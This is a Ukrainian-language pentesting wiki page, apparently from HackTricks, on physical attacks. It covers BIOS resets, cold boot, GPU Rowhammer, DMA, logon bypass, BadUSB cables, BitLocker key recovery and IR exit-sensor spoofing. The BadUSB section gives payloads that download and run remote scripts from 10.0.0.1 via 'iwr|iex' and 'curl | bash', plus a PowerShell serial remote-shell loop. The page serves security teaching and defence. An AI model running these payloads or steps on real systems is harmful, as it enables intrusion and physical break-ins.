# Фізичні атаки

{{#include ../banners/hacktricks-training.md}}

## Відновлення пароля BIOS і безпека системи

Налаштування мікропрограми застарілих ПК можна скинути, від'єднавши батарею CMOS або скориставшись документованою перемичкою clear-CMOS. Необхідний час перебування пристрою без живлення залежить від конкретної плати, а сучасні паролі чи ключі UEFI можуть зберігатися в енергонезалежній flash-пам'яті, вбудованому контролері або пристрої безпеки й тому зберігатися після вилучення батареї. Перед замиканням контактів ознайомтеся з посібником до плати або сервісним посібником; ця процедура також може зробити недійсними вимірювання TPM і спричинити відновлення шифрування диска.

У застарілих системах x86 такі інструменти, як **killCMOS** і **CmosPwd**, можуть перевіряти або змінювати налаштування, що зберігаються в CMOS, із завантажувального середовища. CmosPwd розпізнає формати паролів із документованого набору старіших сімейств BIOS і може створювати резервні копії, відновлювати або стирати/знищувати стан CMOS; опубліковані збірки призначені для застарілих середовищ DOS/Windows, Linux, FreeBSD і NetBSD.<sup>[[18]](#references)</sup> Ці утиліти не є універсальними засобами видалення паролів UEFI та потребують достатнього доступу до апаратного забезпечення/мікропрограми.

У деяких мікропрограмах ноутбуків після кількох невдалих спроб введення пароля відображається специфічний для виробника код виклику. Бази даних, як-от [bios-pw.org](https://bios-pw.org), можуть генерувати застарілі паролі відновлення виробника для деяких моделей, але багато систем реалізують блокування без коду виклику, який можна вивести. Вважайте будь-який згенерований пароль специфічним для моделі та не допускайте вичерпання лічильників спроб, які неможливо скинути.

### Безпека UEFI

Для сучасних систем **UEFI** CHIPSEC може перевіряти захист змінних Secure Boot. Спочатку виконайте перевірку нижче без внесення змін; необов'язковий режим `-a modify` навмисно намагається пошкодити змінні, тому його слід використовувати лише на лабораторній системі, яку можна відновити. Сам CHIPSEC попереджає, що його привілейований драйвер і низькорівневий доступ до апаратного забезпечення непридатні для робочих кінцевих точок.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Аналіз RAM і атаки Cold Boot

DRAM не втрачає кожен біт одразу після припинення refresh. Швидкість деградації суттєво залежить від технології модуля та температури; охолодження може зберігати корисні дані набагато довше, ніж неохолоджене перезавантаження живлення. Атака cold-boot швидко перезавантажує систему в мале середовище збору даних або переносить охолоджений модуль, захоплює сиру пам'ять і відновлює криптографічні ключі, незважаючи на деградацію бітів. Утиліта для копіювання дисків автоматично не є засобом створення образу фізичної пам'яті, а Volatility аналізує захоплені дані, а не отримує їх; використовуйте відповідний для платформи перевірений інструмент збору даних.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer проти таблиць сторінок

Сучасні атаки GPU Rowhammer стають значно кориснішими, коли націлені на **метадані віртуальної пам'яті GPU**, а не на звичайні буфери. Останні дослідження **GDDR6 NVIDIA Ampere GPUs** показують, що зловмисник, який виконує непривілейований CUDA-код, може створювати специфічні для GPU шаблони hammering, використовувати **memory massaging** для розміщення структур paging у вразливих рядках, а потім інвертувати біти в **таблиці сторінок останнього рівня** або проміжному **каталозі сторінок**. Після пошкодження одного запису трансляції зловмисник може отримати **довільне читання/запис пам'яті GPU**, а потім перейти до компрометації host.<sup>[[1]](#references)[[2]](#references)</sup>

### Шаблон експлуатації

1. **Профілювати рядки, придатні для hammering**, у GDDR6 і створити шаблони hammering, що враховують refresh / є нерівномірними та обходять засоби захисту в DRAM.
2. **Виконати memory massaging виділень GPU**, щоб driver розміщував структури трансляції сторінок у фізичних місцях, придатних для hammering, замість зберігання їх у типовому захищеному пулі. На практиці це може означати вичерпання області page-table для малої пам'яті та розпилення великих розріджених UVM-мапінгів із контрольованими кроками.
3. **Інвертувати метадані трансляції**, такі як **PFN** або біти, пов'язані з aperture, усередині запису page-table / page-directory, щоб контрольована зловмисником віртуальна сторінка вказувала на сторінки таблиць сторінок, довільну пам'ять GPU або видимі для host системні мапінги.
4. Повторно використати підроблений мапінг для перезапису додаткових записів трансляції та підвищити привілеї до **довільного читання/запису пам'яті GPU** між контекстами GPU.

### Перехід до host і засоби захисту

- Якщо **IOMMU вимкнено**, підроблені мапінги system-aperture можуть відкрити GPU доступ до довільної **фізичної пам'яті host**, перетворюючи примітив GPU на повну компрометацію host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** націлений на записи таблиці сторінок останнього рівня, тоді як **GeForge** показує, що пошкодження рівня каталогу сторінок може бути простішим, оскільки одна інверсія біта може перенаправити більшу піддеревоподібну структуру трансляції. Не вважайте лише один рівень paging критичним для безпеки.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** залишається важливим, оскільки блокує прямий шлях до довільної пам'яті host, який використовують GDDRHammer/GeForge, але це **не повний засіб захисту**. **GPUBreach** демонструє перехід на другому етапі, коли зловмисник пошкоджує доступні для запису GPU буфери CPU, якими володіє driver, а потім активує memory-safety bugs у driver NVIDIA, щоб отримати примітив запису в kernel і **root shell**, навіть коли IOMMU увімкнено.<sup>[[3]](#references)</sup>
- **System-level ECC** є практичним кроком hardening на підтримуваних workstation/server GPU. Споживчі GPU без ECC мають слабший захисний контур.<sup>[[4]](#references)</sup>
- Ці атаки не є суто теоретичними: **GeForge** повідомила про **1 171** інверсію бітів на RTX 3060 і **202** на RTX A6000, чого було достатньо для побудови робочого ланцюга підвищення привілеїв на host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Атаки Direct Memory Access (DMA)

Для offline-патчингу UEFI IFR/NVRAM, який може знизити рівень enforcement IOMMU до завантаження ОС і ввімкнути ланцюг DMA у Windows, дивіться:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** демонструє **отримання та патчинг пам'яті через DMA** через такі інтерфейси, як FireWire і ранні конфігурації Thunderbolt, включно з історичними ознаками обходу входу в систему. Це не просто «неефективно проти Windows 10»: можливість експлуатації залежить від інтерфейсу, build цільової системи, політики IOMMU, стану блокування, а також від того, чи підтримується та чи ввімкнено Windows Kernel DMA Protection. Windows 10 версії 1803 і новіші додали Kernel DMA Protection на сумісних платформах, суттєво змінивши attack surface.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB для доступу до системи

У незашифрованому або вже розблокованому томі Windows offline-середовище може замінити accessibility binaries, такі як **sethc.exe** або **Utilman.exe**, на **cmd.exe**, що надає командний рядок SYSTEM під час запуску відповідного shortcut на екрані входу. Інструменти на кшталт **chntpw** можуть редагувати дані локальних облікових записів SAM. Ці методи не обходять заблокований том BitLocker і можуть пошкодити облікові дані, захищені DPAPI/EFS; зберігайте forensic-копії та backups.

**Kon-Boot** — комерційний інструмент обходу автентифікації під час завантаження для підтримуваних конфігурацій Windows/macOS. Сумісність залежить від ОС, режиму firmware, Secure Boot і конфігурації disk-encryption; він не розшифровує том, заблокований BitLocker.<sup>[[10]](#references)</sup>

---

## Робота із засобами безпеки Windows

### Комбінації клавіш завантаження та відновлення

- **Delete/Supr**, F2, F10 або інша клавіша виробника можуть відкрити налаштування firmware.
- **F8** входить до legacy-опцій розширеного завантаження Windows лише в конфігураціях, де цей шлях залишається ввімкненим; поточний спосіб входу до recovery відрізняється.
- Утримування **Shift** може вимкнути автоматичний вхід Windows у деяких конфігураціях, хоча policy/registry settings можуть вимкнути таку поведінку.<sup>[[17]](#references)</sup>

### BAD USB Devices

Такі пристрої, як **USB Rubber Ducky** і плати Teensy, можуть визначатися як довірені HID-клавіатури та вводити заздалегідь визначені натискання клавіш. Спочатку payload має привілеї та доступ до desktop поточної сесії; запити UAC, блокування екрана, розкладка клавіатури, timing і USB policy endpoint усе ще обмежують його.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Привілеї адміністратора або backup можуть створити shadow copy чи зберегти registry hives, щоб можна було отримати заблоковані файли, такі як **SAM** і **SYSTEM**. Це техніка збору даних після компрометації, а не обхід підвищення привілеїв; її слід зіставляти з подіями `diskshadow`/VSS і експорту registry hives.

## Техніки BadUSB / HID Implant

### Wi-Fi managed cable implants

- Імпланти на базі ESP32-S3, такі як **Evil Crow Cable Wind**, приховані всередині кабелів USB-A→USB-C або USB-C↔USB-C, визначаються виключно як USB-клавіатура та надають доступ до свого C2 stack через Wi-Fi. Оператору потрібно лише живити кабель від host жертви, створити hotspot з іменем `Evil Crow Cable Wind` і паролем `123456789`, а потім відкрити [http://cable-wind.local/](http://cable-wind.local/) (або його DHCP-адресу), щоб отримати доступ до вбудованого HTTP-інтерфейсу.<sup>[[8]](#references)</sup>
- Вебінтерфейс містить вкладки *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* і *Config*. Збережені payload позначаються для відповідної ОС, розкладки клавіатури перемикаються на льоту, а рядки VID/PID можна змінювати для імітації відомих периферійних пристроїв.
- Оскільки C2 розташований усередині кабелю, телефон може підготувати payload, запускати їх і керувати Wi-Fi credentials без використання мережі організації — це корисно для фізичних проникнень із коротким часом перебування.

### OS-aware AutoExec payloads

- Правила AutoExec прив'язують один або кілька payload до негайного запуску після USB enumeration. Імплант виконує спрощене fingerprinting ОС і вибирає відповідний script.
- Приклад workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) або `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Оскільки виконання відбувається без участі користувача, проста заміна charging cable може забезпечити початковий “plug-and-pwn” доступ у контексті користувача, який увійшов до системи.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Збережений payload відкриває console і вставляє loop, який виконує все, що надходить через новий USB serial device. Мінімальний варіант для Windows:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Імплант підтримує USB CDC-канал відкритим, поки його ESP32-S3 запускає TCP-клієнт (Python-скрипт, Android APK або desktop executable) у напрямку оператора. Будь-які байти, введені в TCP-сеанс, пересилаються до наведеного вище serial-каналу, забезпечуючи віддалене виконання команд навіть на ізольованих від мережі хостах. Вивід обмежений, тому оператори зазвичай виконують команди навмання (створення облікових записів, підготовка додаткових інструментів тощо).

### Поверхня HTTP OTA-оновлення

- Документований інтерфейс Evil Crow Cable Wind надає неавтентифіковану кінцеву точку оновлення firmware за адресою `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Польові оператори можуть «гаряче» змінювати функції (наприклад, прошити firmware flash USB Army Knife) під час операції, не відкриваючи кабель, що дає implant змогу переходити до нових можливостей, залишаючись підключеним до цільового хоста.

## Обхід шифрування BitLocker

Авторизоване forensic-збирання даних із працюючої або нещодавно запущеної системи може містити головний ключ тому BitLocker або пов’язані ключові матеріали, поки том розблокований. Commercial tools, як-от Elcomsoft Forensic Disk Decryptor і Passware Kit Forensic, можуть шукати їх у підтримуваних memory images, hibernation files або crash dumps, але успіх не гарантований. Сучасна Windows також шифрує crash dumps, коли BitLocker увімкнено, а збережений 48-значний recovery password є іншим артефактом, ніж ключ тому в пам’яті.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering для додавання Recovery Key

Зловмисник, який переконав адміністратора виконати команди керування BitLocker, може додати recovery-password, external-key або інший protector, а потім отримати його. Recovery password не може бути довільним рядком із нулів: числові recovery passwords BitLocker мають перевірений 48-значний формат. Відповідний синтаксис авторизованого адміністрування: `manage-bde -protectors -add C: -recoverypassword`; перелічіть створені protectors за допомогою `manage-bde -protectors -get C:`. Відстежуйте додавання protectors і забезпечте escrow нових recovery material лише до схвалених розташувань.<sup>[[16]](#references)</sup>

---

## Exploiting Chassis Intrusion / Maintenance Switches для скидання BIOS до заводських налаштувань

Багато сучасних ноутбуків і настільних комп’ютерів малого форм-фактора мають **chassis-intrusion switch**, за яким стежать Embedded Controller (EC) і firmware BIOS/UEFI. Хоча основне призначення перемикача — створити сповіщення, коли пристрій відкривають, виробники іноді реалізують **undocumented recovery shortcut**, який активується, коли перемикач перемикають у певній послідовності.<sup>[[5]](#references)[[6]](#references)</sup>

### Як працює Attack

1. Перемикач підключений до **GPIO interrupt** на EC.
2. Firmware, що працює на EC, відстежує **timing і number of presses**.
3. Коли розпізнано жорстко задану послідовність, EC викликає процедуру *mainboard-reset*, яка **стирає вміст системної NVRAM/CMOS**.
4. Під час наступного завантаження відповідні моделі завантажують скинутий стан firmware. Залежно від виробника та ревізії, очищений стан може містити supervisor password, custom boot settings або enrolled Secure Boot keys; стан TPM і наслідки для disk-encryption потрібно оцінювати окремо.

> Скидання firmware може відновити параметри external-boot, але **не** розшифровує сховище. BitLocker або інша система full-disk encryption може перейти в recovery після змін TPM/firmware і продовжувати захищати внутрішній диск без recovery key.<sup>[[16]](#references)</sup>

### Приклад із реального світу — Framework 13 Laptop

Recovery shortcut для Framework 13 (11th/12th/13th-gen):
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Після десятого циклу EC встановлює прапорець, який дає BIOS вказівку стерти NVRAM під час наступного перезавантаження. Уся процедура займає ~40 с і потребує **лише викрутки**.<sup>[[5]](#references)</sup>

### Загальна процедура експлуатації

1. Увімкніть або переведіть цільовий пристрій у режим призупинення й виведіть із нього, щоб EC запрацював.
2. Зніміть нижню кришку, щоб отримати доступ до перемикача відкриття корпуса/технічного обслуговування.
3. Відтворіть специфічну для виробника послідовність перемикань (перегляньте документацію, форуми або виконайте reverse-engineer прошивки EC).
4. Зберіть пристрій і перезавантажте його, після чого перевірте, які саме налаштування firmware та облікові дані справді змінилися.
5. За наявності дозволу та можливості зовнішнього завантаження завантажте контрольований live-образ. Якщо внутрішній том було легітимно розблоковано (або його ніколи не шифрували), live-середовище може отримати облікові дані та дані або перевірити EFI System Partition. Модифікація цього розділу для встановлення EFI implant є постійною та дуже intrusive, а також залишається обмеженою Secure Boot, measured boot, захистом firmware від запису й моніторингом endpoint. Зашифроване сховище залишається недоступним без ключа або матеріалів відновлення.

### Виявлення та протидія

* Реєструйте події відкриття корпуса в консолі керування OS та зіставляйте їх із неочікуваними скиданнями BIOS.
* Використовуйте **пломби з індикацією втручання** на гвинтах/кришках для виявлення відкриття.
* Тримайте пристрої у **фізично контрольованих зонах**; виходьте з припущення, що фізичний доступ дорівнює повній компрометації.
* Якщо це можливо, вимкніть функцію “maintenance switch reset” виробника або вимагайте додаткової cryptographic authorisation для скидання NVRAM.

---

## Приховане IR-інжектування проти безконтактних сенсорів виходу

### Характеристики сенсора
- Типові сенсори “wave-to-exit” поєднують near-IR LED emitter із receiver module у стилі пульта дистанційного керування, який повідомляє logic high лише після виявлення кількох імпульсів (~4–10) правильного carrier (≈30 kHz).<sup>[[7]](#references)</sup>
- Пластиковий кожух не дає emitter і receiver дивитися безпосередньо один на одного, тому controller припускає, що будь-який validated carrier походить від близького відбиття, і керує relay, який відкриває door strike.
- Після того як controller вважає, що ціль присутня, він часто змінює outbound modulation envelope, але receiver продовжує приймати будь-який burst, що відповідає відфільтрованому carrier.

### Послідовність атаки
1. **Захопіть профіль випромінювання** — під’єднайте logic analyser до контактів controller, щоб записати waveforms до та після виявлення, які керують внутрішнім IR LED.
2. **Відтворюйте лише waveform “post-detection”** — від’єднайте/проігноруйте штатний emitter і керуйте зовнішнім IR LED уже triggered pattern від самого початку. Оскільки receiver враховує лише кількість/частоту імпульсів, він сприймає spoofed carrier як справжнє відбиття та активує relay line.
3. **Керуйте передаванням** — передавайте carrier налаштованими bursts (наприклад, десятки мілісекунд увімкнення та приблизно стільки ж вимкнення), щоб передати мінімальну кількість імпульсів, не перевантажуючи AGC receiver або його логіку обробки перешкод. Безперервне випромінювання швидко знижує чутливість сенсора й припиняє спрацьовування relay.

### Далекобійне відбивне інжектування
- Заміна bench LED на потужний IR diode, MOSFET driver і focusing optics забезпечує надійне спрацьовування з відстані ~6 м.
- Зловмиснику не потрібна пряма видимість receiver aperture; наведення променя на внутрішні стіни, стелажі або дверні рами, видимі через скло, дає змогу відбитій енергії потрапити в поле огляду ~30° і імітувати помах рукою на близькій відстані.
- Оскільки receivers розраховані лише на слабкі відбиття, значно потужніший зовнішній промінь може відбиватися від кількох поверхонь і все одно залишатися вище detection threshold.

### Weaponised Attack Torch
- Вбудовування driver у комерційний flashlight приховує інструмент на видноті. Замініть видимий LED на потужний IR LED, узгоджений із band receiver, додайте ATtiny412 (або подібний MCU) для генерації bursts ≈30 kHz і використайте MOSFET для відведення струму LED.
- Телескопічна zoom lens звужує промінь для збільшення дальності/точності, а vibration motor під керуванням MCU дає haptic confirmation активності modulation без випромінювання видимого світла.
- Перемикання між кількома збереженими modulation patterns (із дещо різними carrier frequencies та envelopes) підвищує сумісність із різними rebranded sensor families, даючи оператору змогу проводити beam по відбивних поверхнях, доки relay не клацне звуком і двері не відкриються.

---

## References

- [1] [GDDRHammer: Значне порушення роботи рядків DRAM — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Натисніть тут, щоб отримати pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Посібник зі скидання Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Обхід безконтактних IR-сенсорів виходу за допомогою прихованого IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Офіційна документація Kon-Boot та інформація про сумісність](https://kon-boot.com/)
- [11] [Документація CHIPSEC - Захист змінних Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Захист Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Документація Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Посібник з операцій BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Утримування Shift і поведінка автоматичного входу](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Документація та завантаження CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
